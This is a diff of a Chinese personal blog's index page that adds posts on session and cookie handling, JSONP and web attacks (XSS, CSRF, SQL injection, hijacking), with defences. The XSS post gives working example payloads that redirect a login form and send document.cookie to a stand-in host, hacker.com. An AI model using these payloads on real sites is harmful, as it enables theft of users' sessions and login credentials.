@@ -259,6 +259,382 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/session&cookie.html">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="YooHannah">
+    <meta itemprop="description" content>
+    <meta itemprop="image" content="/psb.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="My Little World">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="My Little World" src>
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/post/performance/cache/session&cookie.html" itemprop="url">
+                  session 和cookie
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-28T08:17:15+08:00">
+                2017-12-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
+<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
+<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
+<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
+<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
+<h1 id="cookie-机制"><a href="#cookie-机制" class="headerlink" title="cookie 机制"></a>cookie 机制</h1><p>浏览器拿到set-cookie后，会根据sessionid ,域名，路径等相关信息，生成cookie，存到cookie列表中<br>当用户要请求服务器时，就根据请求资源路径去查cookie表，找到的cookie可用的范围如果大于等于请求路径,<br>就将cookie放在请求头给回服务器</p>
+<p>1.cookie存储<br>会话cookie存储在内存中，页面关闭就删除<br>设置了过期时间的cookie,会被存储在硬盘上，直到超过设定时间才会被删除</p>
+<p>2.cookie与浏览器<br>存储在硬盘上的cookie可以在不同浏览器进程间共享<br>对于内存上的cookie不同浏览器有不同处理方式<br>IE通过 ctrl+N 的方式打开的窗口可以与原窗口共享cookie,但其他方式不行<br>而火狐的所有进程和标签页都可以共享cookie</p>
+<p>一般情况下通过js window.open打开的窗口会与原窗口共享内存cookie</p>
+<h1 id="游客识别跟踪"><a href="#游客识别跟踪" class="headerlink" title="游客识别跟踪"></a>游客识别跟踪</h1><p>用户未登录情况下进行页面请求，且之后都不进行登录操作的情况下，还要与用户保持可进行身份识别的通信，<br>这种情景解决办法可以有<br>A.<br>一般就需要依靠识别机器来识别用户了<br>首先给未登录用户设置访问用户cookie,<br>根据不同机型用canvas写字像素是不一样的原理<br>这个cookie由游客设备的各种机器特征码组合起来生成给到服务器，<br>服务器存起来<br>下次再访问的时候，就依靠客户端建立的cookie进行识别<br>或者将机器信息传给服务器，由服务器生成再传给浏览器</p>
+<p>B.<br>使用fingerprint.js包，它是一个可以根据浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，<br>然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器</p>
+<p>由未登录到登录态要做的事情就要注意两个账号的关联</p>
+<p>奇葩问题：在一台设备登录过多个账号的情况下，怎样进行未登录数据的关联<br>首先设备一般会让你先退出再登录另一个账号,<br>即便要登录多个账号,要做关联，在第一个用户登录后就关联完了，后面多个再登录已经不再是由未登录到登录状态了</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/jsonp.html">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="YooHannah">
+    <meta itemprop="description" content>
+    <meta itemprop="image" content="/psb.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="My Little World">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="My Little World" src>
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/post/js/jsonp.html" itemprop="url">
+                  关于jsonp
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:57:15+08:00">
+                2017-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="关于jsonp"><a href="#关于jsonp" class="headerlink" title="关于jsonp"></a>关于jsonp</h1><p>是一种json数据的使用模式的名称，<br>获取的资料可以是任意js</p>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>1.在script标签中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.xxxx.com/myService.aspx?param=senddata&amp;jsonp=callbackFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">js:</span><br><span class="line">function callbackFunction(result,methodName)&#123;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>服务端提供的js脚本会根据param=senddata等查询条件过滤数据，根据jsonp=callbackFunction，动态生成callbackFunction函数，把要传递的数据以参数形式传递进去<br>例，这里服务端js会生成如下语句供回调<br>callbackFunction(data1,dat2),data1,data2即传递的数据<br>2.在ajax中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">dataType:&apos;jsonp&apos;,</span><br><span class="line">data:&apos;id=10&apos;,</span><br><span class="line">jsonp:&apos;jsonp_callback&apos;,</span><br><span class="line">url:&apos;http://www.xxxxx.com/getdata&apos;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">//dostuff</span><br><span class="line">&#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>可以直接的success回调函数中使用数据进行处理<br>3.在$.get中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$.get(</span><br><span class="line">&apos;http://xxxxxx.com/services.php?callback=?&apos;,</span><br><span class="line">&#123;</span><br><span class="line">	param: data,  //参数</span><br><span class="line">	function (json) &#123; //dosomething &#125;,  //回调函数，?会替换为这里</span><br><span class="line">  &apos;jsonp&apos;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<p>4.在$get.json中使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&quot;http://xxxxx.com/services?param1=data1&amp;param1=data2&amp;format=json&amp;jsoncallback=?&quot;,</span><br><span class="line">function(data)&#123; //回调函数</span><br><span class="line">//dosomething</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/safe/XSSCSRF.html">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="YooHannah">
+    <meta itemprop="description" content>
+    <meta itemprop="image" content="/psb.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="My Little World">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="My Little World" src>
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/post/safe/XSSCSRF.html" itemprop="url">
+                  XSS 与 CSRF
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T07:56:15+08:00">
+                2017-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在页面HTML注入js代码，获取页面信息，再将信息传递到攻击者站点</p>
+<h2 id="注入js方法"><a href="#注入js方法" class="headerlink" title="注入js方法"></a>注入js方法</h2><p>1.直接将获取信息的代码放在<script></script>标签里面，利用拼接html的过程，将攻击代码注入到HTML<br>2.将攻击代码代码放在攻击者站点里面,利用script标签src属性,将文件引入<br>3.利用页面标签事件属性，攻击代码以触发函数的形式注入，标签事件触发同时触发获取信息的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//例1.原本访问www.original.com/login?id=maya,实现自动将maya赋值到ID输入框里面</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;maya&apos;&gt;</span><br><span class="line">//但如果在访问的同时注入攻击代码，如下</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script&gt;var+f=document.getElementById(&apos;login&apos;);+f.action=&apos;http://hacker.com/pwee&apos;;+f.method=&apos;get&apos;;&lt;/script&gt;&quot;</span><br><span class="line">//页面代码就会变成</span><br><span class="line">&lt;input type=&apos;text&apos; value=&apos;&apos;&gt;&lt;script&gt;var f=document.getElementById(&apos;login&apos;); f.action=&apos;http://hacker.com/pwee&apos;; f.method=&apos;get&apos;;&lt;/script&gt;</span><br><span class="line">//登录按钮的id为login，即用户输入id,密码，等登录信息后点击登录按钮时，不仅会向正常的登录网站www.original.com发送登录信息,</span><br><span class="line">//同时会向http://hacker.com站点发送登录信息,攻击者即得到用户的登录信息，如果是支付页面，即可以得到支付密码</span><br><span class="line"></span><br><span class="line">//例2.获取用户登录态cookie的攻击代码xss.js放在攻击者的站点,如下</span><br><span class="line">var content = escape(document.cookie) //escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。</span><br><span class="line">document.write(&quot;&lt;img src=&apos;http://hacker.com/?&apos;&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&apos;&gt;&apos;);</span><br><span class="line">//本次代码注入的方式变为访问</span><br><span class="line">www.original.com/login?id=&quot;&gt;&lt;script src=&apos;http://hacker.com/xss.js&apos;&gt;&lt;/script&gt;&quot;</span><br><span class="line">就会执行xss.js的代码，将用户cookie通过img的src发出的请求送到hacker站点</span><br><span class="line"></span><br><span class="line">//例3. form表单提交时，给提交按钮添加触发事件，触发函数即注入的攻击代码</span><br><span class="line">&lt;input type=&apos;submit&apos; onclick=&apos;hacker()&apos;&gt;</span><br><span class="line">//如果需要用户无察觉的触发，可使用onmousemove、onload等事件进行触发</span><br></pre></td></tr></table></figure></p>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>对代码进行漏洞检查；<br>对特殊字符进行encode;<br>对富文本进行白名单处理;<br>在js里面不要用eval,innerHTML；<br>在response头部的set-cookie中添加httponly,不允许脚本操作document.cookie;<br>使用x-xss-protection报头<br>对特殊字符进行encode<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ’ 替换成 &#39;<br>把 ’ 替换成 &quot;<br>代码 div.innerHTML = userComment.replace(/&gt;/g, ‘&lt;’).replace…</p>
+<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>攻击站点通过用户触发攻击代码获取登录态，伪造用户身份向源站请求资源或发送信息</p>
+<p><img src="/image/csrf.png" alt="csrf"><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">相关链接</a></p>
+<h2 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h2><p>1.利用token,让token以参数角色返回服务器，服务器对比之前保存的token，从而判断该请求来自正常页面请求，攻击站点无法获取到token，因此就不能进行任何操作<br>2.利用攻击站点无法获取cookie的弱点，对获取到的cookie进行转换成token后以参数形式返回后台，因为攻击站点没法获取cookie,也就没办法返回参数<br>3.使用strict-transport-security报头</p>
+<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><p>前端提交的数据未经校验处理直接存到数据库，然后从数据库中读取直接插入到页面中<br>1.如果提交的数据本来含有可解析的代码，从数据库读取后在插入过程中可造成XSS攻击<br>2.如果提交的数据含有SQL查询语句，且被直接拼接到SQL语句中被执行，可能会导致执行结果与预期不同的现象</p>
+<h2 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h2><p>对前端提交的数据进行严格校验</p>
+<h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><p>表现就是DNS服务器上解析表被篡改，导致将正常访问的域名指向篡改后的域名</p>
+<h1 id="HTTP劫持"><a href="#HTTP劫持" class="headerlink" title="HTTP劫持"></a>HTTP劫持</h1><p>数据包被修改或插入，导致页面出现弹窗广告<br>解决办法就是使用HTTPS<br>使用upgrade-insecure-request报头请求升级HTTPS<br>使用content-security-policy报头响应升级HTTPS</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/lazyload.html">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1287,479 +1663,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/safe/http.html">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="YooHannah">
-    <meta itemprop="description" content>
-    <meta itemprop="image" content="/psb.jpg">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="My Little World">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="My Little World" src>
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/post/safe/http.html" itemprop="url">
-                  关于HTTP
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-05T22:53:37+08:00">
-                2017-10-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="在浏览器的地址栏输入url后发生了什么"><a href="#在浏览器的地址栏输入url后发生了什么" class="headerlink" title="在浏览器的地址栏输入url后发生了什么"></a>在浏览器的地址栏输入url后发生了什么</h1><p> 粗略的回答的话，就是浏览器向服务器发送该url,浏览器根据该url找到相应的资源，再把资源返回给浏览器，即使我们看到的页面内容<br> 细致的回答的话，浏览器会在应用层利用DNS协议解析域名生成ip地址，利用http协议生成一个http请求然后传递给传输层，传输层将根据TCP协议将这个http请求报文进行分割并打上序号标记、端口号和三次握手标志后转发给网络层，网络层会利用ARP协议根据ip地址查到MAC地址,IP协议对数据封装MAC地址等信息，将打包好的数据包发送给链路层再封装然后发送出去，经过一系列转发，忽略路由、CDN的缓存策略，中转到达服务器后,服务器再按链路层，网路层，传输层，应用层的顺序，从下到上依次解封数据信息，找到资源后，同样分割，封装打包再传给客户端浏览器。</p>
-<h2 id="重新看待这个问题"><a href="#重新看待这个问题" class="headerlink" title="重新看待这个问题"></a>重新看待这个问题</h2><p> <a href="https://www.processon.com/view/link/5f14489ce401fd06f3e2fd4b" target="_blank" rel="noopener">流程图1</a><br> <a href="https://www.processon.com/view/link/5f1448cee0b34d44f052743c" target="_blank" rel="noopener">流程图2</a><br> <img src="/image/browerurl.png" alt="browerurl"></p>
-<h3 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h3><p> 解析HTML构建DOM树时，渲染引擎会先将HTML元素标签解析成<br> 由多个DOM元素对象节点组成且具有节点父子关系的DOM树结构，<br> 然后根据DOM树结构的每个节点顺序提取计算使用的CSS规则<br> 并重新计算DOM树结构的样式数据，<br> 生成一个带有样式描述的dom渲染树对象<br> DOM渲染树生成结束后进入渲染树的布局阶段<br> 即根据每个渲染树节点在页面中的大小和位置，将节点固定到页面对应位置上<br> 这个阶段主要是元素的布局属性（position，float,margin等属性）<br> 即在浏览器中绘制页面上元素节点的位置<br> 绘制阶段将渲染树节点的背景，颜色，文本等样式信息应用到每个节点上<br> 这个阶段主要是元素的内部显示样式（color,background,text-shadow等属性）生效<br> 最终完成整个DOM在页面上的绘制显示</p>
-<p> 不同浏览器内核渲染过程有区别<br> Webkit内核(google,safari)中HTML和css解析可以认为是并行的，生成的渲染对象被叫做渲染树（render tree）<br> Geoko内核（firefox）则是先解析html生成sink后再开始解析CSS，生成的渲染对象称为Frame树(Frame tree)</p>
-<p> 在渲染树生成阶段，DOM树中的结点会在CSS分析树中根据元素，类，id选择器来提取与之对应元素的一条或多条CSSRule,进行CSS规则的层叠和权重计算，<br> 得到最终生成的样式CSSRule并添加到DOM渲染树上，<br> 当每个Dom节点提取CSS样式完成时，用于页面布局和绘制的DOM渲染树便形成了<br> 在一个已经形成的DOM渲染树中，节点的CSS规则可通过<br> document.defaultView.getComputedStyle(element,null)<br> 方法获取</p>
-<h1 id="关于-TCP-IP-协议"><a href="#关于-TCP-IP-协议" class="headerlink" title="关于 TCP/IP 协议"></a>关于 TCP/IP 协议</h1><p>1.不同的硬件、操作系统之间的通信，所有这一切都需要一种规则，这种规则即协议<br>2.与互联网相关联的协议集合起来就是TCP/IP<br>3.http协议是TCP/IP协议的一个子集<br>4.URI(统一资源标识符)，用字符串标识某一互联网资源，而url表示资源的地点</p>
-<h2 id="分层管理"><a href="#分层管理" class="headerlink" title="分层管理"></a>分层管理</h2><p>好处:局部改变设计，只需把变动的层替换，无需整体替换<br>应用层：应用服务间通信，如FTP,DNS服务，应用http协议<br>传输层：网络连接中两台计算机之间数据传输，应用TCP和UDP协议<br>网络层：处理网络上流动的数据包，应用IP协议<br>链路层：处理连接网络的硬件之间通信，包括操作系统，硬件的设备驱动，光纤等。</p>
-<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><p>目的在于确保准确无误的将数据送达目的地<br>TCP协议在封装数据时会封装SYN和ACK作为握手标识<br>发送端首先发送一个带SYN标识的数据包给对方，接收端收到后，回传一个带有SYN/ACK标识的数据包以示传达确认信息，最后，发送端再回传一个带ACK标识的数据包，代表‘握手’结束<br>若在握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包</p>
-<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>1.请求报文由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成<br>2.响应报文基本上由协议版本、状态码(表示请求成功或失败的数字代码)、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成<br>3.http是无状态协议，即不保存之前发送过的请求或响应<br>4.持久链接的特点：只要任意一端没有明确提出断开连接，则保持TCP连接状态，<br>旨在建立1次TCP连接后进行多次请求和响应的交互<br>5.管线化技术：在持久链接状态下，不用等待响应亦可直接发送下一个请求，实现并行发送多个请求<br>6.请求方法<br>GET:访问已被URI识别的资源,获取响应内容<br>POST：传输实体的主体<br>PUT：在请求报文主体中包含文件内容，然后保存到请求URI指定的位置，自身不带验证机制<br>HEAD:用于确认URI的有效性及资源更新的日期时间等<br>DELETE：按请求URI删除指定的资源，不带验证机制<br>OPTION：查询针对请求URI指定的资源支持的方法<br>TRACE: 将之前的请求通信环回给客户端,可以查询发送出去的请求是怎样被加工修改/篡改的，但容易引发XST攻击<br>CONNECT：在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL和TLS协议把通信内容加密后经网络隧道传输</p>
-<h2 id="COOKIE状态管理"><a href="#COOKIE状态管理" class="headerlink" title="COOKIE状态管理"></a>COOKIE状态管理</h2><p>客户端在未携带cookie信息状态下请求服务器时，服务器会生成cookie，并记住是向谁发送的，然后在响应报文头中添加一个叫Set-Cookie的字段信息，通知客户端保存Cookie。<br>当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去<br>服务器端发现客户端发送过来的Cookie后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息.<br>7.报文由报文首部、空格和报文主体构成</p>
-<p>请求报文的报文首部分为：请求行(请求方法,URI,HTTP版本)、请求首部字段、通用首部字段、实体首部字段、其他<br>响应报文的报文首部分为：状态行(状态码,原因短语,HTTP版本)、响应首部字段、通用首部字段、实体首部字段、其他</p>
-<p>报文主体即传输请求或响应的实体主体</p>
-<p>提升传输效率采取的方法：传输编码，对实体进行‘内容编码’，压缩传输内容，分块传输编码</p>
-<p>发送不同类型数据时，需要首部字段Content-Type<br>请求报文的Content-Type赋值mulitipart/form-data,<br>响应报文的Content-Type赋值mulitipart/byteranges,</p>
-<p>请求指定范围数据时，可以用首部字段Range指定资源的byte范围<br>例：请求开始到3000，和5000到7000字节的多重范围<br>Range:bytes=-3000,5000-7000<br>响应状态码会返回206，多重范围会在首部添加Content-Type：mulitipart/byteranges<br>如果服务器无法响应范围请求，则会返回状态码200OK和完整的实体内容</p>
-<p>内容协商机制：客户端和服务端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。<br>内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准<br>对应首部字段有：Accept,Accept-Charset,Accept-Encoding,Accept-Language,Content-Language<br>内容协商技术有三类：<br>服务器驱动协商：以请求首部字段为参考，在服务器端自动处理<br>客户端驱动协商：用户在浏览器可选列表中手动选择<br>透明协商：前两者的结合体，由服务端和客户端各自进行内容协商的一种方法</p>
-<p>8.状态码</p>
-<p>1XX:请求正在处理<br>2XX:请求正常那个处理完毕<br>3XX：重定向，需要进行附加操作以完成请求，<br>4XX：服务器无法处理请求,客户端有错误发生<br>5XX：服务器处理请求出错</p>
-<p>200 OK 客户端的请求在服务器被正常处理了<br>204 No Content ，正常处理，但响应不含实体<br>206 Partial Content  成功处理了范围请求，响应只含指定范围实体</p>
-<p>301 Moved Permanently 永久重定向<br>302 Found 临时重定向<br>303 See Other 临时重定向，但只能使用get方法访问该资源<br>304 Not Modified 服务器没有找到符合客户端附带条件(If-Match,If-Range等报文首部)的资源，响应不含主体，与重定向无关,服务器告诉客户，原来缓冲的文档还可以继续使用<br>307 Temporary Redirect 临时重定向，按照浏览器标准不会从post变成GET。但浏览器不同，出现情况也可能不同</p>
-<p>400 Bad Request 请求报文存在语法错误<br>401 Unauthorized 携带信息未通过HTTP认证，没有权限访问资源<br>403 Forbidden 请求的资源被服务器拒绝访问<br>404 Not Found 无法找到请求资源</p>
-<p>500 Internal Server Error 服务器在执行请求时发生了错误，也可能是web应用存在bug或临时故障<br>502 bad gateway 网关错误<br>503 Service Unavailable 服务器暂时处于超负载或正在进行停机维护</p>
-<p>9.通信数据转发程序<br>代理：接收客户端请求并转发给源服务器，不改变URI,但在转发时会添加via首部<br>好处：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的等等<br>使用方法分两类：<br>1.是否使用缓存,例,缓存代理(预先将资源副本存在代理服务器上);<br>2.是否会修改报文,例,透明代理(对报文不做任何加工，反之非透明代理)</p>
-<p>网关：转发其他服务器数据的服务器，接收从客户端发来的请求并对请求进行处理<br>好处：能使通信线路上服务器提供非HTTP协议服务，能提高通信安全性</p>
-<p>隧道：在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序<br>目的：确保客户端能与服务器进行安全的通信，通信双发断开连接时结束</p>
-<p>缓存：代理服务器或客户端本地磁盘内保存的资源副本 ，其实相当于是一种代理服务器<br>目的：减少对源服务器的访问，从而节省通信流量和通信时间<br>机制：超过有效期之后，会向源服务器确认资源有效性，若判断缓存失效，则再次从源服务器上获取‘新’资源</p>
-<p>10.首部字段<br>分两类：缓存代理和非缓存代理<br>缓存代理，即端到端首部，这类首部会被带到客户端或服务端，且会保存在缓存中<br>非缓存代理，即逐跳首部，只对单词转发有效，会因通过缓存或代理而不再转发</p>
-<p>通用首部：客户端和服务端都会用的首部<br><img src="/image/header1.png" alt="header1"><br>请求首部<br><img src="/image/header2.png" alt="header2"><br>响应首部<br><img src="/image/header3.png" alt="header3"><br>实体首部<br><img src="/image/header4.png" alt="header4"><br>cookie 相关首部<br><img src="/image/header5.png" alt="header5"><br>一些需要注意的字段<br>connection:close 完成本次响应后，无需等待后续请求，断开链接<br>connection:keep-alive 完成本次响应后保持链接等待后续请求</p>
-<p>connection:upgrade<br>upgrade:websocket<br>这两者组合在一起时，表示客户端申请的更换协议，<br>服务端允许切换，此时报头为101，表示还需要等待完成切换的过程</p>
